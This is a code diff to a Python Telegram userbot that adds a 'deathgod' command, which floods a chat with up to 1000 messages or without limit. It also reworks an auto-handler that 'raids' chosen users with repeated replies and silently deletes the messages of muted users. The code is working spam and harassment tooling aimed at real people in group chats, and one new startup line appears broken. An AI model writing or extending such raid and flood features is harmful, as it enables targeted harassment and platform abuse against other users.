-                        ub.NC_STATE["task"] = None
-                        stopped_count += 1
-                await safe_edit(event, f"🛑 Name Changer stopped for {stopped_count} active userbot(s).")
+                user_bot.NC_STATE["active"] = False
+                if user_bot.NC_STATE.get("task") and not user_bot.NC_STATE["task"].done():
+                    user_bot.NC_STATE["task"].cancel()
+                    try:
+                        await user_bot.NC_STATE["task"]
+                    except asyncio.CancelledError:
+                        pass
+                user_bot.NC_STATE["task"] = None
+                await safe_edit(event, "🛑 Name Changer stopped.")
                 return
             elif action == "set":
                 if len(parts) < 3:
-                    return await safe_edit(event, "❌ Give language and text.\nExample: `.nc set hindi Zyrex`")
+                    return
                 lang = parts[1].lower()
                 text = parts[2]
                 allowed = {"hindi","urdu","bengali","bihari","english","emoji"}
                 if lang not in allowed:
-                    return await safe_edit(event, f"❌ Language must be one of: {', '.join(allowed)}")
+                    return
                 if user_bot.NC_STATE.get("task") and not user_bot.NC_STATE["task"].done():
                     user_bot.NC_STATE["task"].cancel()
                     try:
@@ -3317,6 +3563,57 @@ async def run_user_bot(session_string, chat_id):
                 await safe_edit(event, f"✅ Name Changer started with language `{lang}` and text `{text}`.")
             else:
                 await safe_edit(event, "❌ Invalid action. Use `set` or `stop`.")
+
+        # ─── DEATHGOD (Spam) ───
+        @register_cmd("deathgod")
+        async def cmd_deathgod(event, arg):
+            chat = event.chat_id
+            count = None
+            if arg and arg.strip().isdigit():
+                count = int(arg.strip())
+                if count < 1: count = 1
+                if count > 1000: count = 1000
+            reply_to = None
+            if event.is_reply:
+                reply = await event.get_reply_message()
+                if reply:
+                    reply_to = reply.id
+
+            if chat in user_bot.spray_tasks and not user_bot.spray_tasks[chat].done():
+                return
+            await safe_edit(event, f"☠️ Deathgod started{' with reply' if reply_to else ''}{' (' + str(count) + ' msgs)' if count else ' (infinite)'}...")
+            async def loop():
+                sent = 0
+                try:
+                    while chat in user_bot.spray_tasks:
+                        if count is not None and sent >= count:
+                            break
+                        txt = random.choice(deathgod_replies)
+                        sent += 1
+                        await safe_send(chat, txt, reply_to=reply_to)
+                        if sent % 30 == 0:
+                            await asyncio.sleep(3)
+                        await asyncio.sleep(user_bot.SPRAY_DELAY)
+                except asyncio.CancelledError:
+                    pass
+                finally:
+                    user_bot.spray_tasks.pop(chat, None)
+                    if sent > 0:
+                        await safe_send(chat, f"☠️ Deathgod done: {sent} messages sent.")
+            user_bot.spray_tasks[chat] = asyncio.create_task(loop())
+            await safe_edit(event, f"☠️ Deathgod started{' with reply' if reply_to else ''}{' (' + str(count) + ' msgs)' if count else ' (infinite)'}")
+
+        @register_cmd("sdeathgod")
+        async def cmd_sdeathgod(event, _):
+            chat = event.chat_id
+            if chat not in user_bot.spray_tasks:
+                return
+            try:
+                user_bot.spray_tasks[chat].cancel()
+            except:
+                pass
+            user_bot.spray_tasks.pop(chat, None)
+            await safe_edit(event, "🛑 Deathgod stopped.")
 
         # ─── DISPATCHER ───
         @user_bot.on(events.NewMessage)
@@ -3346,32 +3643,29 @@ async def run_user_bot(session_string, chat_id):
 
             if prefix == "!":
                 if sender not in OWNER_IDS:
-                    await safe_edit(event, "❌ You are not the owner.")
                     return
             else:
                 if sender not in OWNER_IDS and sender not in user_bot.admins:
-                    await safe_edit(event, "@zyrex_x_aetherbot use krlo mst userbot hai")
                     return
                 if cmd in owner_only_commands and sender not in OWNER_IDS:
-                    await safe_edit(event, "❌ Owner only command")
                     return
 
             if cmd_data.get("needs_reply") and not event.is_reply and not arg:
-                return await safe_edit(event, f"❌ Reply or pass target")
+                return
             if cmd_data.get("group_only"):
                 try:
                     if not event.is_group:
-                        return await safe_edit(event, "⚠️ Group only command")
+                        return
                 except:
                     return
             try:
                 await cmd_data["func"](event, arg)
-            except FloodWaitError as fw:
-                await safe_edit(event, f"⏳ FloodWait: {fw.seconds}s")
-            except Exception as e:
-                await safe_edit(event, f"❌ Error: {str(e)[:50]}")
+            except FloodWaitError:
+                pass
+            except Exception:
+                pass
 
-        # ─── AUTO HANDLER ───
+        # ─── AUTO HANDLER (FULLY IMPLEMENTED) ───
         @user_bot.on(events.NewMessage)
         async def auto_handler(event):
             if event.out:
@@ -3380,12 +3674,16 @@ async def run_user_bot(session_string, chat_id):
             chat = event.chat_id
             if not sender or sender in OWNER_IDS:
                 return
+
+            # --- Mute / Global Mute ---
             if sender in user_bot.muted_users or sender in user_bot.global_muted:
                 try:
                     await event.delete()
                 except:
                     pass
                 return
+
+            # --- Watchspam ---
             ws_key = (chat, sender)
             if ws_key in user_bot.watch_spam:
                 now = time.time()
@@ -3398,6 +3696,8 @@ async def run_user_bot(session_string, chat_id):
                     except:
                         pass
                     return
+
+            # --- Group Lock ---
             if chat in user_bot.group_locks:
                 if not is_admin(sender):
                     try:
@@ -3405,27 +3705,66 @@ async def run_user_bot(session_string, chat_id):
                     except:
                         pass
                     return
+
             now = time.time()
             last_reply = user_bot.reply_cooldowns.get(sender, 0)
             if now - last_reply < 1.0:
                 return
-            try:
-                if sender in user_bot.reply_users:
-                    await safe_send(chat, random.choice(reply_list), reply_to=event.id)
-                    user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.replygod_users:
-                    for _ in range(4):
-                        await safe_send(chat, random.choice(reply_texts), reply_to=event.id)
-                        await asyncio.sleep(0.3)
-                    user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.flag_users:
-                    await safe_send(chat, random.choice(flag_texts), reply_to=event.id)
-                    user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.hrr_users:
-                    await safe_send(chat, random.choice(heart_replies), reply_to=event.id)
-                    user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.rr_users:
-                    bot_msg = await safe_send(chat, random.choice(fun_texts), reply_to=event.id)
+
+            # --- Shayari Raid ---
+            if sender in user_bot.shayari_raid:
+                remaining = user_bot.shayari_raid[sender]
+                if remaining is not None and remaining <= 0:
+                    del user_bot.shayari_raid[sender]
+                    return
+                await safe_send(chat, random.choice(shayari_texts), reply_to=event.id)
+                user_bot.reply_cooldowns[sender] = now
+                if remaining is not None:
+                    user_bot.shayari_raid[sender] = remaining - 1
+                return
+
+            # --- Rizz Raid ---
+            if sender in user_bot.rizz_raid:
+                remaining = user_bot.rizz_raid[sender]
+                if remaining is not None and remaining <= 0:
+                    del user_bot.rizz_raid[sender]
+                    return
+                await safe_send(chat, random.choice(rizz_texts), reply_to=event.id)
+                user_bot.reply_cooldowns[sender] = now
+                if remaining is not None:
+                    user_bot.rizz_raid[sender] = remaining - 1
+                return
+
+            # --- Reply Raid ---
+            if sender in user_bot.reply_users:
+                await safe_send(chat, random.choice(reply_list), reply_to=event.id)
+                user_bot.reply_cooldowns[sender] = now
+                return
+
+            # --- Reply God (4 replies) ---
+            if sender in user_bot.replygod_users:
+                for _ in range(4):
+                    await safe_send(chat, random.choice(reply_texts), reply_to=event.id)
+                    await asyncio.sleep(0.3)
+                user_bot.reply_cooldowns[sender] = now
+                return
+
+            # --- Flag Raid ---
+            if sender in user_bot.flag_users:
+                await safe_send(chat, random.choice(flag_texts), reply_to=event.id)
+                user_bot.reply_cooldowns[sender] = now
+                return
+
+            # --- Heart Raid ---
+            if sender in user_bot.hrr_users:
+                await safe_send(chat, random.choice(heart_replies), reply_to=event.id)
+                user_bot.reply_cooldowns[sender] = now
+                return
+
+            # --- RR Raid (Reply + React) ---
+            if sender in user_bot.rr_users:
+                bot_msg = await safe_send(chat, random.choice(fun_texts), reply_to=event.id)
+                if bot_msg:
                     try:
                         await user_bot(functions.messages.SendReactionRequest(
                             peer=chat, msg_id=bot_msg.id,
@@ -3433,37 +3772,19 @@ async def run_user_bot(session_string, chat_id):
                         ))
                     except:
                         pass
+                user_bot.reply_cooldowns[sender] = now
+                return
+
+            # --- Custom Raid ---
+            if sender in user_bot.custom_raid_users:
+                data = user_bot.custom_raid_users.get(sender)
+                if data and data.get("count", 0) > 0:
+                    await safe_send(chat, data.get("text", ""), reply_to=event.id)
+                    data["count"] = data["count"] - 1
+                    if data["count"] <= 0:
+                        del user_bot.custom_raid_users[sender]
                     user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.custom_raid_users:
-                    data = user_bot.custom_raid_users.get(sender)
-                    if data and data.get("count", 0) > 0:
-                        await safe_send(chat, data.get("text", ""), reply_to=event.id)
-                        data["count"] = data["count"] - 1
-                        if data["count"] <= 0:
-                            del user_bot.custom_raid_users[sender]
-                        user_bot.reply_cooldowns[sender] = now
-                if sender in user_bot.shayari_raid:
-                    remaining = user_bot.shayari_raid[sender]
-                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.0:
-                        await safe_send(chat, random.choice(deathgod_list), reply_to=event.id)
-                        user_bot.reply_cooldowns[sender] = now
-                        if remaining is not None:
-                            if remaining > 1:
-                                user_bot.shayari_raid[sender] = remaining - 1
-                            else:
-                                del user_bot.shayari_raid[sender]
-                if sender in user_bot.rizz_raid:
-                    remaining = user_bot.rizz_raid[sender]
-                    if now - user_bot.reply_cooldowns.get(sender, 0) >= 1.5:
-                        await safe_send(chat, random.choice(rizz_texts), reply_to=event.id)
-                        user_bot.reply_cooldowns[sender] = now
-                        if remaining is not None:
-                            if remaining > 1:
-                                user_bot.rizz_raid[sender] = remaining - 1
-                            else:
-                                del user_bot.rizz_raid[sender]
-            except Exception as e:
-                print(f"Auto reply error: {e}")
+                    return
 
         # ─── CACHE & ANTI-DELETE ───
         @user_bot.on(events.NewMessage(outgoing=True))
@@ -3555,7 +3876,10 @@ async def run_user_bot(session_string, chat_id):
         except:
             pass
 
-# ─── WEB SERVER FOR RENDER (KEEP-ALIVE) ───
+# ─── WEB SERVER ───
+from flask import Flask
+import threading
+
 app = Flask(__name__)
 
 @app.route('/')
@@ -3567,9 +3891,22 @@ def run_web():
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
 
-threading.Thread(target=run_web, daemon=True).start()
-
-# ─── MAIN BOT STARTER ───
+# ─── MAIN ───
 if __name__ == "__main__":
     print("🚀 Main bot starting with Web Server...")
+
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(init_db())
+    loop.run_until_complete(init_cipher())
+
+    sessions = loop.run_until_complete(load_sessions())
+    for uid, sess_str in sessions.items():
+        try:
+            asyncio.create_task(run_user_bot_with_restart(sess_str, uid))
+            print(f"✅ Restored session for user {uid}")
+        except Exception as e:
+            print(f"❌ Failed to restore {uid}: {e}")
+            loop.run_until_complete(delete_session(uid))
+
+    threading.Thread(target=run_web, daemon=True).start()
     main_bot.run_until_disconnected()
